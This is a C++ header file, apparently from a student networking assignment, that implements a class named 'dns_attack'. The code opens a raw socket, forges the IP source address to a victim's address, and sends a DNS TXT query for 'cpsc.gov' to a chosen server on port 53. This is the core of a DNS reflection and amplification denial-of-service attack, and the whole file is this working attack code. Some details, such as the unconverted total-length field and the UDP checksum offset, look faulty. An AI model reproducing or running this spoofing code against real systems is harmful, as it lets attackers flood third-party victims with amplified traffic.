#ifndef DNS_ATTACK
#define DNS_ATTACK

#include "misc.h"
#include <cstring>
#include <string>
#include <iostream>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

class dns_attack {
private:
	std::string Victim_IP, Server_IP;
	int Source_Port;
public:
	void attack();
	dns_attack();
	dns_attack(std::string Victim_IP, int Source_Port, std::string Server_IP) : Victim_IP(Victim_IP), Source_Port(Source_Port), Server_IP(Server_IP) {};
};


dns_attack::dns_attack() {
	Source_Port = 0;
	Victim_IP = "";
	Server_IP = "";
}

void dns_attack::attack() {
	int sockfd = Socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	{
		std::cout << "Set up socket option........." << std::endl;
		int one = 1;
		Setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int));
		std::cout << "Success!" << std::endl;
	}

	/* DNS payload setup */
	struct dns_header_t {
		uint16_t xid;      /* Randomly chosen identifier */
		uint16_t flags;    /* Bit-mask to indicate request/response */
		uint16_t qdcount;  /* Number of questions */
		uint16_t ancount;  /* Number of answers */
		uint16_t nscount;  /* Number of authority records */
		uint16_t arcount;  /* Number of additional records */
	};

	struct dns_question_t {
		char *name;        /* Pointer to the domain name in memory */
		uint16_t dnstype;  /* The QTYPE (1 = A) */
		uint16_t dnsclass; /* The QCLASS (1 = IN) */
	};

	/* Questioned Hostname */
	char hostname[] = "cpsc.gov";

	/* Set up the DNS header */
	dns_header_t header;
	memset (&header, 0, sizeof (dns_header_t));
	header.xid= htons (0x9A4D);    /* Randomly chosen ID; 9A4D: Jun-Hong 9A21: YojaHuang*/
	header.flags = htons (0x0100); /* Q=0, RD=1 */
	header.qdcount = htons (1);    /* Sending 1 question */

	/* Set up the DNS question */
	dns_question_t question;
	question.dnstype = htons (16);  /* QTYPE 1=A 255=ANY 16=TXT*/
	question.dnsclass = htons (1); /* QCLASS 1=IN */

	/* DNS name format requires two bytes more than the length of the
   domain name as a string */
	question.name = (char *)calloc(strlen (hostname) + 2, sizeof (char));

	/* Leave the first byte blank for the first field length */
	memcpy (question.name + 1, hostname, strlen (hostname));
	uint8_t *prev = (uint8_t *) question.name;
	uint8_t count = 0; /* Used to count the bytes in a field */
	
	/* Traverse through the name, looking for the . locations */
	for (size_t i = 0; i < strlen (hostname); i++) {
		/* A . indicates the end of a field */
		if (hostname[i] == '.') {
			/* Copy the length to the byte before this field, then
			update prev to the location of the . */
			*prev = count;
			prev = (uint8_t *)(question.name + i + 1);
			count = 0;
		}
		else
			count++;
	}
	*prev = count;

	/* Copy all fields into a single, concatenated packet */
	size_t packetlen = sizeof (header) + strlen (hostname) + 2 + sizeof (question.dnstype) + sizeof (question.dnsclass);
	uint8_t *packet = (uint8_t *) calloc(packetlen, sizeof (uint8_t));
	uint8_t *p = (uint8_t *)packet;

	/* Copy the header first */
	memcpy (p, &header, sizeof (header));
	p += sizeof (header);

	/* Copy the question name, QTYPE, and QCLASS fields */
	memcpy (p, question.name, strlen (hostname) + 1);
	p += strlen (hostname) + 2; /* includes 0 octet for end */
	memcpy (p, &question.dnstype, sizeof (question.dnstype));
	p += sizeof (question.dnstype);
	memcpy (p, &question.dnsclass, sizeof (question.dnsclass));

	char buffer[16384];
	memset(buffer, 0, sizeof(buffer));

	struct iphdr *ip = (struct iphdr *) buffer;
	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));

	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 16; // Low delay
	ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + packetlen; // Add the size of DNS payload later.
	ip->id = htons(30678);
	ip->ttl = 64; // hops
	ip->protocol = 17; // UDP
	ip->saddr = inet_addr(Victim_IP.c_str());
	ip->daddr = inet_addr(Server_IP.c_str());

	udp->source = htons(Source_Port);
	udp->dest = htons(53); // dns port number
	udp->len = htons(sizeof(struct udphdr) + packetlen);

	/* Concatenated to the ip, udp header */
	memcpy(buffer + sizeof(struct iphdr) + sizeof(struct udphdr), packet, packetlen);
	
	/* Calculate Checksum */
	ip->check = getCheckSum((unsigned short *)buffer, sizeof(struct iphdr) + sizeof(struct udphdr) + packetlen);
	udp->check = getCheckSum((unsigned short *)buffer + sizeof(struct iphdr), sizeof(struct udphdr) + packetlen);

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(53);
	sin.sin_addr.s_addr = inet_addr(Server_IP.c_str());

	std::cout << sizeof(struct iphdr) << ' ' << sizeof(struct udphdr) << ' ' << packetlen << std::endl;

	if (sendto(sockfd, buffer, ip->tot_len, 0,
	(struct sockaddr *)&sin, sizeof(sin)) < 0)
	{
		perror("sendto()");
		exit(3);
	}
	printf("OK: one packet is sent.\n");


	Close(sockfd);
}


#endif
